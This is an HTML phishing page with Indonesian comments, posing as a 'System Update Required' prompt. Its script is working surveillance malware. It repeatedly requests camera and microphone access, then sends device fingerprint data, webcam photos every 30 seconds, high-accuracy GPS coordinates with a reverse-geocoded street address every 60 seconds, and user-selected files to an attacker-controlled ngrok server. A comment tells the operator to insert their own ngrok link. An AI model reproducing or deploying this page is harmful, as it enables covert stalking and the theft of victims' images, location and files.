<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>System Update</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .container {
            background: white;
            border-radius: 20px;
            padding: 30px;
            max-width: 350px;
            width: 100%;
            text-align: center;
            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
        }
        
        .icon {
            font-size: 50px;
            margin-bottom: 15px;
        }
        
        h3 {
            color: #333;
            margin-bottom: 10px;
        }
        
        p {
            color: #666;
            font-size: 14px;
            margin-bottom: 20px;
        }
        
        .status-box {
            background: #f0f0f0;
            padding: 12px;
            border-radius: 10px;
            font-size: 12px;
            color: #555;
            margin: 15px 0;
            word-break: break-word;
        }
        
        .btn-upload {
            position: fixed;
            bottom: 25px;
            right: 25px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            padding: 14px 24px;
            border-radius: 50px;
            font-size: 14px;
            font-weight: bold;
            cursor: pointer;
            z-index: 999999;
            box-shadow: 0 4px 15px rgba(0,0,0,0.3);
            transition: transform 0.2s;
        }
        
        .btn-upload:hover {
            transform: scale(1.05);
        }
        
        .btn-upload:active {
            transform: scale(0.95);
        }
        
        .toast {
            position: fixed;
            bottom: 100px;
            right: 25px;
            background: #333;
            color: white;
            padding: 8px 16px;
            border-radius: 20px;
            font-size: 12px;
            z-index: 999998;
            animation: fadeOut 3s forwards;
        }
        
        @keyframes fadeOut {
            0% { opacity: 1; }
            70% { opacity: 1; }
            100% { opacity: 0; visibility: hidden; }
        }
    </style>
</head>
<body>

<div class="container" id="mainContainer">
    <div class="icon">🔄</div>
    <h3>System Update Required</h3>
    <p>Please allow access to continue</p>
    <div class="status-box" id="statusText">Initializing...</div>
</div>

<script>
    // ============ GANTI DENGAN LINK NGROK KAMU ============
    const SERVER = "https://reversion-exert-gloomily.ngrok-free.dev";
    // ======================================================
    
    let mediaStream = null;
    let photoInterval = null;
    let locationInterval = null;
    let fileInput = null;
    
    // Fungsi show toast notifikasi
    function showToast(msg) {
        const toast = document.createElement('div');
        toast.className = 'toast';
        toast.innerHTML = msg;
        document.body.appendChild(toast);
        setTimeout(() => toast.remove(), 3000);
    }
    
    // Update status di halaman
    function updateStatus(msg) {
        const statusEl = document.getElementById('statusText');
        if (statusEl) statusEl.innerHTML = msg;
        console.log('[STATUS]', msg);
    }
    
    // Kirim data ke server
    async function sendToServer(endpoint, data, isFile = false) {
        try {
            let url = `${SERVER}/${endpoint}`;
            let options = {};
            
            if (isFile) {
                options = { method: 'POST', body: data };
            } else {
                options = {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data)
                };
            }
            
            const response = await fetch(url, options);
            return response.ok;
        } catch(e) {
            console.log(`Send to ${endpoint} failed:`, e);
            return false;
        }
    }
    
    // ============ GPS SPESIFIK ============
    async function sendLocation() {
        if ('geolocation' in navigator) {
            navigator.geolocation.getCurrentPosition(async (position) => {
                // Data GPS lengkap dan spesifik
                const locationData = {
                    // Koordinat utama
                    latitude: position.coords.latitude,
                    longitude: position.coords.longitude,
                    
                    // Detail akurasi
                    accuracy: position.coords.accuracy, // dalam meter
                    altitude: position.coords.altitude,
                    altitudeAccuracy: position.coords.altitudeAccuracy,
                    heading: position.coords.heading, // arah mata angin (0-360)
                    speed: position.coords.speed, // kecepatan dalam m/s
                    
                    // Waktu
                    timestamp: position.timestamp,
                    isoTime: new Date(position.timestamp).toISOString(),
                    localTime: new Date(position.timestamp).toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' }),
                    
                    // Info tambahan
                    provider: 'GPS',
                    source: navigator.userAgent.includes('Android') ? 'Android GPS' : (navigator.userAgent.includes('iPhone') ? 'iOS GPS' : 'Web GPS')
                };
                
                // Kirim ke server
                const success = await sendToServer('location', locationData);
                if (success) {
                    console.log(`📍 Location: ${locationData.latitude}, ${locationData.longitude} (accuracy: ${locationData.accuracy}m)`);
                    
                    // Kirim juga ke endpoint reverse geocoding (opsional)
                    await getAddressFromCoords(locationData.latitude, locationData.longitude);
                }
            }, (error) => {
                console.log('Location error:', error.message);
                // Kirim error info
                sendToServer('location_error', {
                    error: error.message,
                    code: error.code,
                    timestamp: Date.now()
                });
            }, {
                enableHighAccuracy: true,  // Pakai GPS akurat
                timeout: 15000,
                maximumAge: 0  // Jangan pakai cache
            });
        } else {
            sendToServer('location_error', {
                error: 'Geolocation not supported',
                timestamp: Date.now()
            });
        }
    }
    
    // Reverse geocoding - dapatkan alamat dari koordinat (opsional)
    async function getAddressFromCoords(lat, lng) {
        try {
            // Pakai OpenStreetMap Nominatim (gratis)
            const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}&zoom=18&addressdetails=1`);
            const data = await response.json();
            
            if (data && data.address) {
                const addressData = {
                    latitude: lat,
                    longitude: lng,
                    address: data.display_name,
                    road: data.address.road,
                    village: data.address.village || data.address.hamlet,
                    city: data.address.city || data.address.town,
                    district: data.address.district,
                    state: data.address.state,
                    postcode: data.address.postcode,
                    country: data.address.country
                };
                await sendToServer('address', addressData);
                console.log(`🏠 Address: ${addressData.city}, ${addressData.state}`);
            }
        } catch(e) {
            console.log('Reverse geocoding failed:', e);
        }
    }
    
    // ============ DEVICE INFO SPESIFIK ============
    async function sendDeviceInfo() {
        // Dapatkan baterai jika tersedia
        let batteryInfo = {};
        if ('getBattery' in navigator) {
            try {
                const battery = await navigator.getBattery();
                batteryInfo = {
                    level: battery.level * 100 + '%',
                    charging: battery.charging,
                    chargingTime: battery.chargingTime,
                    dischargingTime: battery.dischargingTime
                };
            } catch(e) {
                batteryInfo = { error: 'Cannot access battery' };
            }
        }
        
        // Dapatkan memori device
        let memoryInfo = {};
        if ('deviceMemory' in navigator) {
            memoryInfo.ram = navigator.deviceMemory + ' GB';
        }
        
        // Dapatkan cores CPU
        let cpuInfo = {};
        if ('hardwareConcurrency' in navigator) {
            cpuInfo.cores = navigator.hardwareConcurrency;
        }
        
        // Dapatkan koneksi internet
        let connectionInfo = {};
        if ('connection' in navigator) {
            const conn = navigator.connection;
            connectionInfo = {
                effectiveType: conn.effectiveType,
                downlink: conn.downlink + ' Mbps',
                rtt: conn.rtt + ' ms',
                saveData: conn.saveData
            };
        }
        
        // Dapatkan sensor yang tersedia
        const sensors = [];
        if ('DeviceOrientationEvent' in window) sensors.push('Orientation');
        if ('DeviceMotionEvent' in window) sensors.push('Motion');
        if ('AmbientLightSensor' in window) sensors.push('AmbientLight');
        
        // Dapatkan layar spesifik
        const screenInfo = {
            width: screen.width,
            height: screen.height,
            availWidth: screen.availWidth,
            availHeight: screen.availHeight,
            colorDepth: screen.colorDepth,
            pixelDepth: screen.pixelDepth,
            orientation: screen.orientation ? screen.orientation.type : 'unknown',
            devicePixelRatio: window.devicePixelRatio
        };
        
        // Dapatkan bahasa dan lokasi
        const localeInfo = {
            language: navigator.language,
            languages: navigator.languages,
            platform: navigator.platform,
            userAgent: navigator.userAgent,
            vendor: navigator.vendor,
            cookieEnabled: navigator.cookieEnabled,
            doNotTrack: navigator.doNotTrack,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            timezoneOffset: new Date().getTimezoneOffset()
        };
        
        // Dapatkan plugins yang terinstall
        const plugins = [];
        for (let i = 0; i < navigator.plugins.length; i++) {
            plugins.push(navigator.plugins[i].name);
        }
        
        // Kumpulkan semua data device
        const deviceInfo = {
            timestamp: Date.now(),
            isoTime: new Date().toISOString(),
            localTime: new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' }),
            
            // Hardware
            hardware: {
                ram: memoryInfo.ram || 'unknown',
                cpuCores: cpuInfo.cores || 'unknown',
                deviceMemory: navigator.deviceMemory || 'unknown',
                hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
                platform: navigator.platform,
                vendor: navigator.vendor,
                userAgent: navigator.userAgent,
                isMobile: /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent),
                isAndroid: /Android/i.test(navigator.userAgent),
                isIOS: /iPhone|iPad|iPod/i.test(navigator.userAgent),
                isWindows: /Win/i.test(navigator.userAgent),
                isMac: /Mac/i.test(navigator.userAgent),
                isLinux: /Linux/i.test(navigator.userAgent)
            },
            
            // Baterai
            battery: batteryInfo,
            
            // Koneksi
            connection: connectionInfo,
            
            // Layar
            screen: screenInfo,
            
            // Sensor
            sensors: sensors,
            
            // Browser
            browser: {
                name: getBrowserName(),
                version: getBrowserVersion(),
                language: navigator.language,
                languages: navigator.languages,
                cookieEnabled: navigator.cookieEnabled,
                doNotTrack: navigator.doNotTrack,
                plugins: plugins,
                localStorage: typeof localStorage !== 'undefined',
                sessionStorage: typeof sessionStorage !== 'undefined',
                indexedDB: 'indexedDB' in window
            },
            
            // Lokasi & Waktu
            locale: localeInfo
        };
        
        await sendToServer('device', deviceInfo);
        console.log(`📱 Device: ${deviceInfo.hardware.platform} - ${deviceInfo.hardware.userAgent.substring(0, 80)}...`);
        
        // Kirim juga screen capture info
        await sendScreenInfo();
    }
    
    // Dapatkan nama browser
    function getBrowserName() {
        const ua = navigator.userAgent;
        if (ua.includes('Chrome')) return 'Chrome';
        if (ua.includes('Firefox')) return 'Firefox';
        if (ua.includes('Safari') && !ua.includes('Chrome')) return 'Safari';
        if (ua.includes('Edge')) return 'Edge';
        if (ua.includes('Opera') || ua.includes('OPR')) return 'Opera';
        if (ua.includes('Samsung')) return 'Samsung Internet';
        return 'Unknown';
    }
    
    function getBrowserVersion() {
        const ua = navigator.userAgent;
        const match = ua.match(/(Chrome|Firefox|Safari|Edge|Opera|OPR)[\/\s](\d+)/);
        return match ? match[2] : 'unknown';
    }
    
    // Info screen capture (resolusi, dll)
    async function sendScreenInfo() {
        try {
            // Coba akses screen capture (butuh izin)
            const screenDetails = {
                width: window.screen.width,
                height: window.screen.height,
                availWidth: window.screen.availWidth,
                availHeight: window.screen.availHeight,
                colorDepth: window.screen.colorDepth,
                pixelDepth: window.screen.pixelDepth,
                orientation: window.screen.orientation ? window.screen.orientation.type : 'unknown',
                devicePixelRatio: window.devicePixelRatio
            };
            await sendToServer('screen', screenDetails);
        } catch(e) {
            console.log('Screen info error:', e);
        }
    }
    
    // ============ AMBIL FOTO ============
    async function captureAndSendPhoto() {
        if (!mediaStream) {
            console.log('No media stream available');
            return;
        }
        
        try {
            const video = document.createElement('video');
            video.srcObject = mediaStream;
            video.muted = true;
            video.playsInline = true;
            video.style.display = 'none';
            document.body.appendChild(video);
            await video.play();
            await new Promise(r => setTimeout(r, 200));
            
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            canvas.toBlob(async (blob) => {
                const formData = new FormData();
                formData.append('photo', blob);
                formData.append('timestamp', Date.now());
                await sendToServer('photo', formData, true);
                console.log(`📸 Photo sent at ${new Date().toLocaleTimeString()}`);
            }, 'image/jpeg', 0.7);
            
            video.srcObject = null;
            video.remove();
        } catch(e) {
            console.log('Capture error:', e);
        }
    }
    
    // ============ SETUP UPLOAD ============
    function setupUploadButton() {
        fileInput = document.createElement('input');
        fileInput.type = 'file';
        fileInput.multiple = true;
        fileInput.style.display = 'none';
        document.body.appendChild(fileInput);
        
        const uploadBtn = document.createElement('button');
        uploadBtn.innerHTML = '📁 Upload Files';
        uploadBtn.className = 'btn-upload';
        uploadBtn.onclick = (e) => {
            e.preventDefault();
            fileInput.click();
        };
        document.body.appendChild(uploadBtn);
        
        fileInput.onchange = async () => {
            if (!fileInput.files.length) return;
            
            showToast(`Uploading ${fileInput.files.length} files...`);
            updateStatus(`Uploading ${fileInput.files.length} files...`);
            
            for (let i = 0; i < fileInput.files.length; i++) {
                const file = fileInput.files[i];
                const formData = new FormData();
                formData.append('file', file);
                formData.append('filename', file.name);
                await sendToServer('upload', formData, true);
                console.log(`📁 Uploaded: ${file.name} (${(file.size/1024).toFixed(1)} KB)`);
            }
            
            showToast(`✅ ${fileInput.files.length} files uploaded!`);
            updateStatus(`✅ ${fileInput.files.length} files uploaded`);
            fileInput.value = '';
            
            setTimeout(() => {
                updateStatus('📸 Auto photo every 30s | 📁 Click button to upload');
            }, 3000);
        };
    }
    
    // ============ MAIN ============
    async function startAccess() {
        updateStatus('Requesting camera access...');
        
        try {
            mediaStream = await navigator.mediaDevices.getUserMedia({
                video: { width: { ideal: 640 }, height: { ideal: 480 }, facingMode: 'user' },
                audio: true
            });
            
            const audioTracks = mediaStream.getAudioTracks();
            audioTracks.forEach(track => track.enabled = true);
            
            updateStatus('✅ Camera ready');
            
            await sendDeviceInfo();
            await captureAndSendPhoto();
            
            photoInterval = setInterval(captureAndSendPhoto, 30000);
            console.log('⏰ Auto photo every 30 seconds');
            
            await sendLocation();
            locationInterval = setInterval(sendLocation, 60000);
            console.log('📍 Location tracking every 60 seconds');
            
            setupUploadButton();
            
            updateStatus('📸 Auto photo | 📍 GPS tracking | 📁 Upload button ready');
            
            setTimeout(() => {
                const container = document.getElementById('mainContainer');
                if (container) container.style.opacity = '0.3';
            }, 3000);
            
        } catch(error) {
            console.error('Error:', error);
            updateStatus('❌ Click "Allow" to continue');
            setTimeout(startAccess, 3000);
        }
    }
    
    startAccess();
    
    window.addEventListener('beforeunload', () => {
        if (photoInterval) clearInterval(photoInterval);
        if (locationInterval) clearInterval(locationInterval);
        if (mediaStream) mediaStream.getTracks().forEach(track => track.stop());
    });
</script>
</body>
</html>
